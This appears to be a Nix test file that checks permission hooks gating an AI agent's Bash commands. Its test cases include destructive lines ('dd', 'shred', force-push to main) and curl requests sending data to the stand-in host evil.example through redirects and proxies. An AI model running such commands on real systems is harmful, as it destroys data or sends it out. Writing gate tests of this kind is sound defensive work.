# Behavioral checks for the PreToolUse Bash hooks in modules/home/tools/hooks.
#
# The hooks are plain scripts read by writeShellApplication in the home module,
# so a check can drive the same file directly: feed it a hook JSON payload on
# stdin and assert whether it emits an "ask" decision or exits silently to fall
# through to the blanket Bash allow.
{ config, ... }:
{
  perSystem =
    { pkgs, system, ... }:
    {
      # Size classes (declare-test-size-classes design D1, D2): the median of
      # nixbot's uncached runs of at least 1 s, read 2026-11-24
      # (logs/tsc-4-durations-runs-20261124-141600.log).
      testSizes.checks =
        {
          x86_64-linux = {
            # nixbot: median 7.3 s, slowest 19 s, all 9 runs 2026-08-29..2026-10-21
            hook-gate-dangerous-commands.class = "small";
            # nixbot: 0 runs, too few to class (design D4)
            hook-gate-mutating-http = {
              class = "medium";
              measured = false;
            };
            # nixbot: median 3.0 s, slowest 80 s, 66 runs in 30 days
            updater-repository-paths.class = "small";
          };
          aarch64-darwin = {
            # nixbot: median 33 s, slowest 39 s, 3 runs in 30 days
            hook-gate-dangerous-commands.class = "small";
            # nixbot: 0 runs, too few to class (design D4)
            hook-gate-mutating-http = {
              class = "medium";
              measured = false;
            };
            # nixbot: median 14 s, slowest 358 s, 69 runs in 30 days
            updater-repository-paths.class = "small";
          };
        }
        .${system} or { };
      checks.hook-gate-dangerous-commands =
        let
          # Each case is "<expected> <command>", where <expected> is ask or allow.
          cases = [
            # Explicit-PID kill is not a gated hazard: the PID names one already
            # identified process, unlike a pattern that can select processes the
            # author never inspected.
            "allow kill 1308"
            "allow kill -TERM 1308"
            "allow kill -9 1234"
            "allow kill -SIGKILL 1234"
            "allow kill -s TERM 1234"
            "allow kill 123 456 789"
            # kill -0 sends no signal; it only probes liveness.
            "allow kill -0 1308"
            "allow kill -0 $WATCHER_PID"
            "allow ps aux | grep watcher"

            # Pattern selectors stay gated in every form.
            "ask pkill watcher"
            "ask pkill -f 'firstmate.*watcher'"
            "ask pkill -9 -f watcher"
            "ask killall node"
            "ask killall -9 node"
            # Indirect kill targets stay gated: the target can resolve to a
            # process the author never named.
            "ask kill $PID"
            "ask kill $(pgrep -f watcher)"
            "ask kill `pgrep watcher`"
            "ask kill -TERM $(cat /tmp/pid)"
            "ask kill -f watcher"
            "ask kill %1"
            "ask kill"
            # A safe-looking segment must not launder a later unsafe one.
            "ask kill 1308; kill $OTHER"
            "ask ps aux | xargs kill"
            # A `kill` inside a quoted search pattern is data, not a command:
            # the `|` alternations of an rg pattern are not shell operators.
            # Observed 2026-08-12: the gate pattern-matched the quoted word and
            # stalled an agent worker on two read-only ripgrep searches.
            "allow rg -n \"process group|kill -.*-\\$|setsid|pgid|kill_tree|_drain\" bin/*.sh | head -40"
            "allow rg -n 'watchdog|kill -9' modules/ | head -20"
            # A genuine process termination next to a quoted pattern still gates.
            "ask rg -n \"kill\" bin/*.sh | head -5; kill $WATCHER_PID"

            # nix run/shell is ungated in every form. An "ask" is a hard stall for
            # an agent worker launched with permissions bypassed, and nix run is
            # unavoidable in normal work in this repository.
            "allow nix run nixpkgs#hello"
            "allow nix run .#some-app -- --flag"
            "allow nix shell nixpkgs#jq"
            # nix subcommands that were never gated stay ungated.
            "allow nix build .#checks.aarch64-darwin.hook-gate-dangerous-commands"

            # Ordinary git push is ungated for the same reason, including to the
            # default ref, which the repository's own merge helper pushes to.
            "allow git push"
            "allow git push -u origin fm/some-branch"
            "allow git -C /some/path push"
            "allow git push origin main"
            "allow git push origin HEAD:main"
            # --force-with-lease to a task branch is the rebase-then-push flow every
            # agent worker runs, and gating it is what stalled four of them. It fails
            # safe on its own: it refuses when the remote moved.
            "allow git push --force-with-lease origin fm/some-branch"
            "allow git push --force-with-lease=fm/some-branch origin fm/some-branch"
            "allow git -C /some/path push --force-with-lease origin fm/some-branch"
            # A branch name merely containing the default ref is not the default ref.
            "allow git push --force origin fm/main-guards"

            # The destructive push forms stay gated.
            "ask git push --force origin main"
            "ask git push -f origin main"
            "ask git push --force-with-lease origin main"
            "ask git push --force-with-lease=main origin main"
            "ask git push --force origin master"
            "ask git push --force origin HEAD:main"
            "ask git -C /some/path push --force origin main"
            "ask git push origin :some-branch"
            "ask git push origin --delete some-branch"
            "ask git push -d origin some-branch"
            "ask git push --mirror origin"
            "ask git push --all origin"

            # Neighbouring gates are unaffected by the two lifts above.
            "ask jj git push"
            "ask jj git push --all-bookmarks"
            "ask git reset --hard HEAD~1"
            "ask git clean -fd"
            "ask sudo systemctl restart foo"
            "ask dd if=/dev/zero of=/dev/disk2"
            "ask truncate -s 0 important.log"
            "ask shred -u secrets.env"
            "ask gh workflow run ci.yml"
            "ask kubectl delete pod foo"
          ];
        in
        pkgs.runCommand "hook-gate-dangerous-commands"
          {
            nativeBuildInputs = [
              pkgs.jq
              pkgs.gnugrep
            ];
            hook = ../home/tools/hooks/gate-dangerous-commands.sh;
            caseFile = pkgs.writeText "gate-dangerous-commands-cases" (
              builtins.concatStringsSep "\n" cases + "\n"
            );
          }
          ''
            set -uo pipefail
            failures=0

            while IFS= read -r line; do
              [ -n "$line" ] || continue
              expected="''${line%% *}"
              command="''${line#* }"

              payload=$(jq -Rn --arg c "$command" '{tool_input: {command: $c}}')
              stderr_file=$(mktemp)
              if output=$(printf '%s' "$payload" | bash "$hook" 2>"$stderr_file"); then
                status=0
              else
                status=$?
              fi

              # The observation must not consult the expectation: classify the
              # hook's behaviour on its own terms, then compare.
              actual=error
              if [ "$status" -eq 0 ]; then
                if [ -z "$output" ]; then
                  # This gate represents allow by exiting successfully and silently.
                  actual=allow
                else
                  actual=$(
                    printf '%s' "$output" \
                      | jq -ers 'if length == 1 then .[0].hookSpecificOutput.permissionDecision | select(. == "ask" or . == "allow") else empty end'
                  ) || actual=error
                fi
              fi

              if [ "$actual" = error ]; then
                echo "FAIL: hook error for: $command" >&2
                echo "  exit status: $status" >&2
                if [ -s "$stderr_file" ]; then
                  echo "  stderr:" >&2
                  sed 's/^/    /' "$stderr_file" >&2
                else
                  echo "  stderr: <empty>" >&2
                fi
                failures=$((failures + 1))
              elif [ "$actual" != "$expected" ]; then
                echo "FAIL: expected $expected, got $actual for: $command" >&2
                failures=$((failures + 1))
              fi

              rm -f "$stderr_file"
            done < "$caseFile"

            if [ "$failures" -ne 0 ]; then
              echo "$failures gate-dangerous-commands case(s) failed" >&2
              exit 1
            fi

            touch $out
          '';

      checks.updater-repository-paths =
        pkgs.runCommand "updater-repository-paths"
          {
            nativeBuildInputs = [ pkgs.ripgrep ];
            updaters = ../../pkgs/by-name;
          }
          ''
            set -uo pipefail
            failures=0
            identity_pattern='BASH_SOURCE|[$][{]?0([^0-9]|$)'

            for updater in "$updaters"/*/update.sh; do
              [ -f "$updater" ] || continue
              package="''${updater%/update.sh}/package.nix"

              if matches=$(rg -n "$identity_pattern" "$updater"); then
                relative_path="''${updater#"$updaters"/}"
                echo "FAIL: $relative_path derives package paths from its copied updater identity:" >&2
                echo "$matches" >&2
                failures=$((failures + 1))
              fi

              if rg -q 'git rev-parse --show-toplevel' "$updater" \
                && ! sed -n '1,2p' "$updater" | rg -q '#!nix-shell.*[[:space:]]git([[:space:]]|$)'; then
                relative_path="''${updater#"$updaters"/}"
                echo "FAIL: $relative_path resolves the repository with git but does not declare git in its nix-shell packages." >&2
                failures=$((failures + 1))
              fi

              if [ -f "$package" ] \
                && rg -q 'outputHash[[:space:]]*=' "$package" \
                && ! rg -q 'outputHash' "$updater"; then
                relative_path="''${updater#"$updaters"/}"
                echo "FAIL: $relative_path does not refresh its package's fixed-output hash." >&2
                failures=$((failures + 1))
              fi
            done

            if [ "$failures" -ne 0 ]; then
              echo "Updater scripts must resolve the repository root with 'git rev-parse --show-toplevel', then address pkgs/by-name/<package> under that root." >&2
              exit 1
            fi

            touch $out
          '';

      # gate-mutating-http, driven as the home module renders it, trusted hosts
      # filled in (flake.lib.gateMutatingHttpScript), with notify-permission-wait
      # replaced by a stub that records its call, so nothing is sent. A mutating
      # request is allowed only when every request in the command goes to a
      # trusted host; anything the hook cannot read from the text asks.
      checks.hook-gate-mutating-http =
        let
          # Each case is "<expected> <command>": allow or ask is the hook's JSON
          # decision, pass is a silent exit for a command that is not curl or wget.
          cases = [
            # One request to a trusted host, in the forms agents use.
            "allow curl -d hi https://ntfy.vanixiets.internal/probe-x"
            "allow curl -d hi https://ntfy.zt/probe-x"
            "allow curl -X POST -d hi ntfy.zt/probe-x"
            "allow curl -sf -m 5 -H 'Title: t' -H \"Priority: high\" -d \"done; all green\" https://ntfy.vanixiets.internal/probe-x"
            "allow curl -sSf --cacert /etc/ssl/root.crt -H @- -d hi https://ntfy.zt:443/probe-x"
            "allow curl --request PUT -T notes.txt https://ntfy.zt/probe-x"
            "allow curl -d hi --url https://ntfy.vanixiets.internal/probe-x"
            "allow curl -dhi https://ntfy.zt/probe-x"
            "allow curl -d hi https://ntfy.zt/probe-x https://ntfy.vanixiets.internal/probe-y"
            # Untrusted or look-alike hosts.
            "ask curl -d hi https://other.vanixiets.internal/x"
            "ask curl -d hi https://ntfy.vanixiets.internal.evil.example/x"
            "ask curl -d hi https://ntfy.zt./probe-x"
            "ask curl -d hi https://NTFY.ZT/probe-x"
            "ask curl -d hi https://ntfy.ｚｔ/probe-x"
            "ask curl -d hi https://xn--ntfy-zt.example/probe-x"
            # Two requests, trusted then untrusted, in each joining form.
            "ask curl -d hi https://ntfy.zt/probe-x https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x --next -d hi https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x -: -d hi https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x; curl -d hi https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x && curl -d hi https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x || curl -d hi https://evil.example/x"
            "ask curl -d hi https://ntfy.zt/probe-x | curl -d @- https://evil.example/x"
            "ask (curl -d hi https://ntfy.zt/probe-x; curl -d hi https://evil.example/x)"
            "ask curl -d hi https://ntfy.zt/probe-x & curl -d hi https://evil.example/x"
            "ask echo https://evil.example/x | xargs curl -d hi https://ntfy.zt/probe-x"
            "ask for u in https://ntfy.zt/probe-x https://evil.example/x; do curl -d hi \"$u\"; done"
            "ask curl -d hi https://ntfy.zt/probe-x\ncurl -d hi https://evil.example/x"
            "ask curl -d hi --url https://evil.example/x https://ntfy.zt/probe-x"
            "ask curl -d hi 'https://{ntfy.zt,evil.example}/x'"
            # A destination the text does not name.
            "ask curl -d hi \"$NTFY_URL/probe-x\""
            "ask curl -d hi $(cat url)"
            "ask curl -d hi `cat url`"
            "ask curl -K request.cfg -d hi https://ntfy.zt/probe-x"
            "ask curl --config request.cfg -d hi https://ntfy.zt/probe-x"
            "ask curl -d hi"
            # The URL names a trusted host but the bytes go elsewhere.
            "ask curl --connect-to ntfy.zt:443:evil.example:443 -d hi https://ntfy.zt/probe-x"
            "ask curl --resolve ntfy.zt:443:203.0.113.9 -d hi https://ntfy.zt/probe-x"
            "ask curl -x http://evil.example:3128 -d hi https://ntfy.zt/probe-x"
            "ask curl --proxy http://evil.example:3128 -d hi https://ntfy.zt/probe-x"
            "ask curl -L -d hi https://ntfy.zt/probe-x"
            "ask curl -sLd hi https://ntfy.zt/probe-x"
            "ask curl --unix-socket /tmp/s -d hi https://ntfy.zt/probe-x"
            "ask https_proxy=http://evil.example:3128 curl -d hi https://ntfy.zt/probe-x"
            # The trusted name only in a header, data, query or userinfo.
            "ask curl -H 'Host: ntfy.zt' -d hi https://evil.example/x"
            "ask curl -d https://ntfy.zt/probe-x https://evil.example/x"
            "ask curl -d hi 'https://evil.example/?u=https://ntfy.zt/'"
            "ask curl -d hi https://evil.example/ntfy.zt/x"
            "ask curl -d hi https://ntfy.zt@evil.example/"
            "ask curl -d hi https://user:pw@ntfy.zt/probe-x"
            # An option the hook does not know may take the next word, so asks.
            "ask curl --frobnicate -d hi https://ntfy.zt/probe-x"
            # wget follows redirects by default, so its mutations always ask.
            "ask wget --post-data=hi https://ntfy.zt/probe-x"
            # Unchanged: requests that do not mutate, and commands that are not curl or wget.
            "allow curl -s https://evil.example/x"
            "allow curl -s https://ntfy.zt/v1/health; curl -s https://evil.example/x"
            "ask curl -d hi https://evil.example/x"
            # A data, form, upload or method flag inside a short-option cluster
            # still makes the request mutating.
            "ask curl -sd hi https://evil.example/x"
            "ask curl -dhi https://evil.example/x"
            "ask curl -sF a=b https://evil.example/x"
            "ask curl -sXPOST https://evil.example/x"
            "pass ntfy-send \"probe\" probe-x"
          ];
        in
        pkgs.runCommand "hook-gate-mutating-http"
          {
            nativeBuildInputs = [
              pkgs.jq
              pkgs.gnugrep
            ];
            hook = pkgs.writeText "gate-mutating-http" config.flake.lib.gateMutatingHttpScript;
            # One JSON payload per line, so a case may hold a newline.
            caseFile = pkgs.writeText "gate-mutating-http-cases" (
              builtins.concatStringsSep "\n" (
                map (
                  case:
                  let
                    expected = builtins.head (builtins.split " " case);
                  in
                  builtins.toJSON {
                    inherit expected;
                    command = builtins.substring (builtins.stringLength expected + 1) (builtins.stringLength case) case;
                  }
                ) cases
              )
              + "\n"
            );
          }
          ''
            set -uo pipefail
            stub=$(mktemp -d)
            printf '#!%s\nprintf "%%s\\n" "$*" >> %s/notified\n' "$(command -v bash)" "$stub" > "$stub/notify-permission-wait"
            chmod +x "$stub/notify-permission-wait"
            export PATH="$stub:$PATH"

            # cases HOOK: runs every case against HOOK, prints each failure and
            # returns the number of failures.
            cases() {
              local hook=$1 failures=0 line expected command output status actual
              while IFS= read -r line; do
                expected=$(jq -r .expected <<< "$line")
                command=$(jq -r .command <<< "$line")
                status=0
                output=$(jq -c '{tool_input: {command: .command}}' <<< "$line" | bash "$hook" 2>/dev/null) || status=$?
                # Classify the hook's behaviour on its own terms, then compare.
                actual=error
                if [ "$status" -eq 0 ]; then
                  if [ -z "$output" ]; then
                    actual=pass
                  else
                    actual=$(jq -er '.hookSpecificOutput.permissionDecision | select(. == "ask" or . == "allow")' <<< "$output") || actual=error
                  fi
                fi
                if [ "$actual" != "$expected" ]; then
                  echo "FAIL: expected $expected, got $actual for: $command"
                  failures=$((failures + 1))
                fi
              done < "$caseFile"
              return "$failures"
            }

            cases "$hook"
            failures=$?
            if [ "$failures" -ne 0 ]; then
              echo "$failures gate-mutating-http case(s) failed" >&2
              exit 1
            fi
            echo "ok: every gate-mutating-http case"

            # mutant NAME EXPECTED: runs the cases against ./NAME, which must fail
            # them, among its failures the case whose command contains EXPECTED.
            mutant() {
              local found
              if found=$(cases "$1"); then echo "FAIL: mutant $1 passed every case"; exit 1; fi
              grep -qF -- "$2" <<< "$found" || { echo "FAIL: mutant $1 did not fail on $2: $found"; exit 1; }
              echo "mutant $1 rejected, $(grep -c '^FAIL' <<< "$found") case(s) failing, among them:"
              grep -F -- "$2" <<< "$found" | sed 's/^/  /'
            }

            # wholeCommand: the trusted names matched anywhere in the command,
            # as before this rule, so the two-request cases are allowed.
            cat > whole.sh <<'SH'
            if [ -n "$REASON" ] && echo "$COMMAND" | grep -qE "(https?://|[[:space:]])($(echo $TRUSTED_HOSTS | sed 's/\./\\./g; s/ /|/g'))(/|:|[[:space:]]|$)"; then
            SH
            substitute "$hook" wholeCommand \
              --replace-fail 'if [ -n "$REASON" ] && trusted_request "$COMMAND"; then' "$(cat whole.sh)"
            mutant wholeCommand 'curl -d hi https://ntfy.zt/probe-x && curl -d hi https://evil.example/x'

            # connectToKnown: --connect-to read as an ordinary option with a value.
            substitute "$hook" connectToKnown \
              --replace-fail '--next | --config | --connect-to | --resolve' '--next | --config | --resolve' \
              --replace-fail '--data | --data-raw |' '--connect-to | --data | --data-raw |'
            mutant connectToKnown 'curl --connect-to ntfy.zt:443:evil.example:443'
            touch $out
          '';
    };
}
